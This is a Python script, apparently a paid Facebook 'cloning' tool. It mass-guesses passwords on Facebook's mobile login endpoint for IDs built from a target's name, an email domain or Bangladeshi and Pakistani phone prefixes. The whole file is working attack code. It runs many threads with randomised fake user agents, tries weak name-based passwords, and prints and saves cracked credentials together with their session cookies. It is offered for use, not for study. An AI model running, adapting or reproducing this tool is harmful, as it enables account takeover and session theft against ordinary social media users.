#SC MAKED BY djsb
#Fuck djsb HOSSEN
#Dec By djsb
#djsb Your Reyal Pappa
#djsb Kids Numbar 5

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14'])
	c='SM-M136B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(1,99)
	e='0'
	f=random.randrange(1,99)
	g=random.randrange(1,99)
	h='Mobile Safari/537.36'
	i=(['[FB_IAB/FB4A;FBAV/425.0.0.22.49;]'])
	djsb=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h} {i}")
	ugen.append(djsb)

for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14'])
	c='V1814A Build/PKQ1.180819.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(1,99)
	e='0'
	f=random.randrange(1,999)
	g=random.randrange(1,99)
	h='Mobile Safari/537.36'
	i=(['[FB_IAB/FB4A;FBAV/315.0.0.47.113;]'])
	djsb=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h} {i}")
	ugen.append(djsb)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14'])
	c='SAMSUNG SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/'
	d=random.randrange(1,999)
	e='0'
	f=random.randrange(1,9999)
	g=random.randrange(1,999)
	h='Mobile Safari/537.36'
	uaku2=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(uaku2)
for ua in range(10000):
	a='Nokia 225 4G/'
	b=random.randrange(1,3)
	c='0'
	d=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L',',M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
	e='Profile/MIDP-2.0 Configration/CLDC-1.1'
	uaku2=f'{a}{b}.{c} {d} {e}'
	ugen.append(uaku2)

for ua in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14'])
	c='en-in; SM-M325F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(1,115)
	e='0'
	f=random.randrange(1,5800)
	g=random.randrange(1,199)
	h='Mobile Safari/537.36'
	i='PHX/13.2'
	uaku2=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h} {i}'
	ugen.append(uaku2)

for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14'])
	c='RMX3171 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(1,115)
	e='0'
	f=random.randrange(1,5800)
	g=random.randrange(1,199)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/355.0.0.6.103;]'
	uaku2=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(uaku2)
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

logo = ("""
\033[1;33m db   db  .d8b.  .88b  d88. d888888b .88b  d88. 
\033[1;33m 88   88 d8' `8b 88'YbdP`88   `88'   88'YbdP`88 
\033[1;32m 88ooo88 88ooo88 88  88  88    88    88  88  88 
\033[1;32m 88~~~88 88~~~88 88  88  88    88    88  88  88 
\033[1;36m 88   88 88   88 88  88  88   .88.   88  88  88 
\033[1;36m YP   YP YP   YP YP  YP  YP Y888888P YP  YP  YP 

\033[1;92m══════════════════════════════════════════
\033[1;32m[~] TOOLS TYPE:\033[1;32m PAID
\033[1;32m[~] AUTHOR    :\033[1;32m djsb FARABI
\033[1;32m[~] GITHUB    :\033[1;32m djsb-404
\033[1;32m[~] FACEBOOK  :\033[1;32m djsb ON PIRE
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS djsb BRAND\033[;0m\033[1;91m═══>\033[1;92m""")

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(" \033[1;97m[1] FACEBOOK EMAIL ID CLONING     \033[1;91m[WORKING] ")
        print(" \033[1;97m[2] FACEBOOK USERNAME CLONING     \033[1;35m[BEST]")
        print(" \033[1;97m[3] FACEBOOK VIP RANDOM CLONING   \033[1;33m[FIRE]")
        print(" \033[1;97m[0] Exit")
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        Snigdho =input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3","03"]:
            v3()
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('[~]  TERGET FIRST NAME : ')
    kodex = input('[~] TERGET LAST NAME :  ')
    print('[~] example Doamin : @gmail.com, @yahoo.com ')
    doamin = input('[~]  Input Doamin  : ')
    limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[~]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m[~]  Target Doamin:\033[1;92m {doamin}")
        print('\033[1;97m[~]  The process has been started')
        print('[~]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('[~]  TERGET FIRST NAME : ')
    kodex = input('[~] TERGET FIRST NAME :  ')
    doamin = '.'
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[~]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m[~]  Target Doamin:\033[1;92m Facebook CLONING (name)")
        print('\033[1;97m[~]  The process has been started')
        print('[~]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print('[~] Crack process has been completed')
    print('[~] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v3():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID CLONE")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    
    kode = input(' [📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' FACEBOOK VIP CLONING (BD NUMBER) '
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;33m[~]  TOTAL IDS :\033[1;92m '+tl)
        print(f"\033[1;33m[~]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
        print('\033[1;33m[~]  THE CRACK PROCESS HAS BEEN STARTED')
        print('\033[1;33m[~]  WAIT FOR IDS ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print('[~] Crack process has been completed')
    print('[~] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mCraking\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.alpha.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.alpha.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  		  'accept-language': 'en-US,en;q=0.9',
 		   'cache-control': 'max-age=0',
		    # 'cookie': 'sb=eDLVZMdyiEQPg4BIddG4SvSG; datr=eDLVZEhEUoNKoHY_6XSubWKl; dpr=2.1988937854766846; m_pixel_ratio=2.1988937854766846; wd=360x800; fr=0S8K50sqYdhecgi28..Bk1TJ4.G8.AAA.0.0.Bk10Yv.AWWimzh5LqE',
  		  'dpr': '2',
		    'sec-ch-prefers-color-scheme': 'dark',
		    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
		    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5770.213", "Google Chrome";v="114.0.5770.213"',
 		   'sec-ch-ua-mobile': '?1',
 		   'sec-ch-ua-model': '""',
		    'sec-ch-ua-platform': '"Android"',
    		'sec-ch-ua-platform-version': '""',
 		   'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
 		   'sec-fetch-site': 'none',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': pro,
		    'viewport-width': '980',}
            lo = session.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[Cracked👻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/djsb/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[checkpoint🔪] {uid}|{ps}")
                open('/sdcard/djsb-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Crack] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
